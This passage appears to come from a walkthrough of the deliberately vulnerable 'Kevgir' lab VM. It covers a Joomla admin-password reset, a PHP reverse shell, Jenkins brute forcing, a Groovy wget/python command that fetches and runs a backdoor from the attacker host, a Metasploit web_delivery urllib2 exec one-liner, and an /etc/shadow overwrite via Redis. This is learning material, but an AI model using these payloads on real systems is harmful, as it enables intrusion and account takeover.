</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.128<span class="o">]</span> 43783
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>106<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>114<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>114<span class="o">(</span>tomcat7<span class="o">)</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/var/lib/tomcat7
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root    root    <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 .
</span><span class='line'>drwxr-xr-x <span class="m">50</span> root    root    <span class="m">4096</span> Feb <span class="m">15</span> 06:40 ..
</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 common
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">12</span> Jun <span class="m">20</span>  <span class="m">2015</span> conf -&gt; /etc/tomcat7
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">17</span> Jun <span class="m">20</span>  <span class="m">2015</span> logs -&gt; ../../log/tomcat7
</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 server
</span><span class='line'>drwxr-xr-x  <span class="m">3</span> tomcat7 tomcat7 <span class="m">4096</span> Feb  <span class="m">3</span> 22:12 shared
</span><span class='line'>drwxrwxr-x  <span class="m">6</span> tomcat7 tomcat7 <span class="m">4096</span> May <span class="m">24</span> 12:40 webapps
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root    root      <span class="m">19</span> Jun <span class="m">20</span>  <span class="m">2015</span> work -&gt; ../../cache/tomcat7
</span></code></pre></td></tr></table></div></figure></p>

<p>Now we are in~</p>

<p>or you can use <code>metasploit (msfconsole)</code> to do this job automatically by using the exploit: <font color="red"><code>exploit/multi/http/tomcat_mgr_upload</code></font>.</p>

<h3>Vector 3: Joomla v1.5 admin password bypass attack</h3>

<p>From the nmap scan result, we know <code>Joomla v1.5</code> is running on target machine&rsquo;s port <code>8081</code>.</p>

<p>Run <code>joomscan</code> to check if any known vulnerability exists, found the joomla version is <code>1.5.1</code> and there is a Remote Admin Password Change Vulnerability.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Fingerprinting in progress <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Use of uninitialized value in pattern match <span class="o">(</span>m//<span class="o">)</span> at ./joomscan.pl line 1009.
</span><span class='line'>~Generic version family <span class="p">&amp;</span>hellip<span class="p">;&amp;</span>hellip<span class="p">;</span>. <span class="o">[</span>1.5.x<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;~1.5.x htaccess.txt revealed <span class="o">[</span>1.5.1 - 1.5.3<span class="o">]</span>
</span><span class='line'>~1.5.x configuration.php-dist revealed <span class="o">[</span>1.5.1 - 1.5.8<span class="o">]</span>
</span><span class='line'>~1.5.x en-GB.xml revealed <span class="o">[</span>1.5.0 - 1.5.1<span class="o">]</span>
</span><span class='line'>~1.5.x en-GB.ini revealed 1.5.1
</span><span class='line'>~1.5.x admin en-GB.com_config.ini revealed <span class="o">[</span>1.5.0<span class="o">(</span>stable<span class="o">)</span> -1.5.1<span class="o">]</span>
</span><span class='line'>~1.5.x admin en-GB.ini revealed 1.5.1
</span><span class='line'>~1.5.x adminlists.html revealed <span class="o">[</span>1.5.0<span class="o">(</span>stable<span class="o">)</span> - 1.5.6<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;The Exact version found is 1.5.1&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Fingerprinting <span class="k">done</span>.&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;15&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability
</span><span class='line'>Versions Affected: 1.5.5 <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span>
</span><span class='line'>Check: /components/com_user/controller.php
</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option<span class="o">=</span>com_user<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">view</span><span class="o">=</span>reset<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">layout</span><span class="o">=</span>confirm  2. Write into field <span class="p">&amp;</span>ldquo<span class="p">;</span>token<span class="p">&amp;</span>rdquo<span class="p">;</span> char <span class="p">&amp;</span>lsquo<span class="p">;</span> and Click OK.  3. Write new password <span class="k">for</span> admin  4. Go to url : target.com/administrator/  5. Login admin with new password
</span><span class='line'>Vulnerable? Yes&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Followed the instruction and change the Joomla admin password to <font color="red"><code>test</code></font>, and then login to the administrator page.</p>

<p><img class="left" src="/downloads/Kevgir/2.png"></p>

<p>Then choose <code>Extensions</code> &ndash;> <code>Template Manager</code> &ndash;> <code>beez</code> (any template will do the job) &ndash;> <code>Edit HTML</code></p>

<p>Then clear all the exist content and paste your PHP exploit code here (in this case, I am using <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">Pentest Monkey</a> one.).</p>

<p>Then save and apply.</p>

<p><img class="left" src="/downloads/Kevgir/3.png"></p>

<p>Finally, setup <code>nc</code> to listen on port <code>4444</code> and preview the page to trigger the exploit:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# nc -lvnp 4444
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.128<span class="o">]</span> 43800
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 14:02:50 up <span class="m">1</span> day,  1:06,  <span class="m">1</span> user,  load average: 0.16, 0.07, 0.06
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>admin    pts/0    10.1.1.130       Mon15    1:33m  0.20s  0.06s sshd: admin <span class="o">[</span>priv<span class="o">]</span>&lt;br/&gt;
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span></code></pre></td></tr></table></div></figure></p>

<h3>Vector 4: Jenkins login bruteforce attack</h3>

<p>Due to Jenkins is vulnerable to brute force attacking&hellip;</p>

<p>so use MSF to brute force attack the jenkins server with common dictionary</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>auxiliary/scanner/http/jenkins_login<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name              Current Setting                                   Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   BLANK_PASSWORDS   <span class="nb">false                                             </span>no        Try blank passwords <span class="k">for</span> all users
</span><span class='line'>   BRUTEFORCE_SPEED  <span class="m">5</span>                                                 yes       How fast to bruteforce, from <span class="m">0</span> to 5
</span><span class='line'>   DB_ALL_CREDS      <span class="nb">false                                             </span>no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       <span class="nb">false                                             </span>no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      <span class="nb">false                                             </span>no        Add all users in the current database to the list
</span><span class='line'>   HTTP_METHOD       POST                                              yes       The HTTP method to use <span class="k">for</span> the login <span class="o">(</span>Accepted: GET, POST<span class="o">)</span>
</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                           yes       The URL that handles the login process
</span><span class='line'>   PASSWORD                                                            no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /root/tools/SecLists/Passwords/john.txt           no        File containing passwords, one per line
</span><span class='line'>   Proxies                                                             no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span><span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">]</span>
</span><span class='line'>   RHOSTS            10.1.1.128                                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             <span class="m">9000</span>                                              yes       The target port
</span><span class='line'>   STOP_ON_SUCCESS   <span class="nb">false                                             </span>yes       Stop guessing when a credential works <span class="k">for</span> a host
</span><span class='line'>   THREADS           <span class="m">10</span>                                                yes       The number of concurrent threads
</span><span class='line'>   USERNAME                                                            no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE                                                       no        File containing users and passwords separated by space, one pair per line
</span><span class='line'>   USER_AS_PASS      <span class="nb">false                                             </span>no        Try the username as the password <span class="k">for</span> all users
</span><span class='line'>   USER_FILE         /root/tools/SecLists/Usernames/top_shortlist.txt  no        File containing usernames, one per line
</span><span class='line'>   VERBOSE           <span class="nb">true                                              </span>yes       Whether to print output <span class="k">for</span> all attempts
</span><span class='line'>   VHOST                                                               no        HTTP server virtual host&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; <span class="nb">set </span>verbose <span class="nb">false</span>
</span><span class='line'><span class="nv">verbose</span> <span class="o">=</span>&gt; <span class="nb">false</span>
</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt; exploit&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> 10.1.1.128:9000 - LOGIN SUCCESSFUL: admin:hello
</span><span class='line'>^C<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Caught interrupt from the console<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>jenkins_login<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Bingo! user login found: <font color="red"><code>admin/hello</code></font>.</p>

<p>Now let&rsquo;s login to jenkins managing page, and following to this <a href="http://dan.thoeisen.dk/hjem/lets-hack-a-jenkins-server/" title="Jenkins attacking tutorial">tutorial</a> to run commands.</p>

<p>Go to <code>Manage Jenkins</code> and then <code>Script Console</code>, input and run the following script code to check if command can be run on the target server.</p>

<p><img class="left" src="/downloads/Kevgir/4.png"></p>

<p>Next, run <code>msfconsole</code> and use payload <code>exploit/multi/script/web_delivery</code> to create python backdoor and setup evil web server on local port <code>8080</code> in order to upload the backdoor.</p>

<p>After evil web server has been established, we input the following code in the script console.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>def <span class="nv">process</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130:8080/z7UgcWwtF&quot;</span>&gt;http://10.1.1.130:8080/z7UgcWwtF&lt;/a&gt; -O /tmp/bdsh4444<span class="p">&amp;</span>rdquo<span class="p">;</span>.execute<span class="o">()</span> &lt;br/&gt;
</span><span class='line'>def <span class="nv">process3</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>python /tmp/bdsh4444<span class="p">&amp;</span>rdquo<span class="p">;</span>.execute<span class="o">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>exploit/multi/script/web_delivery<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name     Current Setting  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   SRVHOST  0.0.0.0          yes       The <span class="nb">local </span>host to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0
</span><span class='line'>   SRVPORT  <span class="m">8080</span>             yes       The <span class="nb">local </span>port to listen on.
</span><span class='line'>   SSL      <span class="nb">false            </span>no        Negotiate SSL <span class="k">for</span> incoming connections
</span><span class='line'>   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
</span><span class='line'>   URIPATH                   no        The URI to use <span class="k">for</span> this exploit <span class="o">(</span>default is random<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Payload options <span class="o">(</span>python/meterpreter/reverse_tcp<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name   Current Setting  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   LHOST  10.1.1.130       yes       The listen address
</span><span class='line'>   LPORT  <span class="m">4444</span>             yes       The listen port&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Exploit target:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Id  Name&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">0</span>   Python&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; exploit
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP handler on 10.1.1.130:4444
</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; <span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Using URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://0.0.0.0:8080/z7UgcWwtF&quot;</span>&gt;http://0.0.0.0:8080/z7UgcWwtF&lt;/a&gt;
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Local IP: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130:8080/z7UgcWwtF&quot;</span>&gt;http://10.1.1.130:8080/z7UgcWwtF&lt;/a&gt;
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Server started.
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Run the following <span class="nb">command </span>on the target machine:
</span><span class='line'>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import urllib2<span class="p">;</span> <span class="nv">r</span> <span class="o">=</span> urllib2.urlopen<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130:8080/z7UgcWwtF&quot;</span>&gt;http://10.1.1.130:8080/z7UgcWwtF&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> <span class="nb">exec</span><span class="o">(</span>r.read<span class="o">())</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.128       web_delivery - Delivering Payload
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">37475</span> bytes<span class="o">)</span> to 10.1.1.128
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:4444 -&gt; 10.1.1.128:36457<span class="o">)</span> at 2016-05-26 07:41:18 -0400&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt;
</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; sessions -i 1&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;meterpreter &gt; sysinfo
</span><span class='line'>Computer     : canyoupwnme
</span><span class='line'>OS           : Linux 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015</span>
</span><span class='line'>Architecture : i686
</span><span class='line'>Meterpreter  : python/python
</span><span class='line'>meterpreter &gt; ifconfig
</span></code></pre></td></tr></table></div></figure></p>

<p>Now Jenkins has been compromised~~</p>

<h3>Vector 5: Redis file upload attack</h3>

<p>Create a shadow file to overwrite target machine:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>debian-tor:*:16661:0:99999:7:::
</span><span class='line'>admin:<span class="nv">$6$9sirPrQg$keedQFIOyFrljiwfiVUcs4HDZzEnEDRm08p9s9Gc</span>.IPEE75ipZ.6ZI0fWs5OLtcA4jXTtMAOmHy6iA2l7eksg1:16661:0:99999:7:::
</span><span class='line'>user:<span class="nv">$6$9sirPrQg$keedQFIOyFrljiwfiVUcs4HDZzEnEDRm08p9s9Gc</span>.IPEE75ipZ.6ZI0fWs5OLtcA4jXTtMAOmHy6iA2l7eksg1:16661:0:99999:7:::
</span><span class='line'>F4l13n:<span class="nv">$6$dZlaWry7$JLdKZhM8F9jH7b4Nr86fOZHVd</span>.1RTQ3VoqCCAP3iEv0rSJL8HVZ0saN89l/MdWjmbQ8Mskx2Q4g1u1kfu4AZI/:16661:0:99999:7:::
</span><span class='line'>ftpuser:!:16679:0:99999:7:::
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Use metasploit payload to upload our shadow file to overwrite target machine.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Module options <span class="o">(</span>auxiliary/scanner/redis/file_upload<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name                    Current Setting        Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   DISABLE_RDBCOMPRESSION  <span class="nb">true                   </span>yes       Disable compression when saving <span class="k">if</span> found to be enabled
</span><span class='line'>   LocalFile               /var/www/html/shadow_  no        Local file to be uploaded
</span><span class='line'>   Password                foobared               no        Redis password <span class="k">for</span> authentication <span class="nb">test</span>
</span><span class='line'><span class="nb">   </span>RHOSTS                  10.1.1.128             yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT                   <span class="m">6379</span>                   yes       The target port
</span><span class='line'>   RemoteFile              /etc/shadow            no        Remote file path
</span><span class='line'>   THREADS                 <span class="m">1</span>                      yes       The number of concurrent threads&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf auxiliary<span class="o">(</span>file_upload<span class="o">)</span> &gt; exploit&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> 10.1.1.128:6379 <span class="p">&amp;</span>ndash<span class="p">;</span> saved <span class="m">1103</span> bytes inside of redis DB at /etc/shadow
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>file_upload<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>and then SSH login to <code>user</code> or <code>admin</code> with the password we set.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x61;&amp;#100;&amp;#109;&amp;#105;&amp;#x6e;&amp;#64;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#109;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#x32;&amp;#x38;&lt;/a&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  G:                ,<span class="p">;</span>                                          &lt;br/&gt;
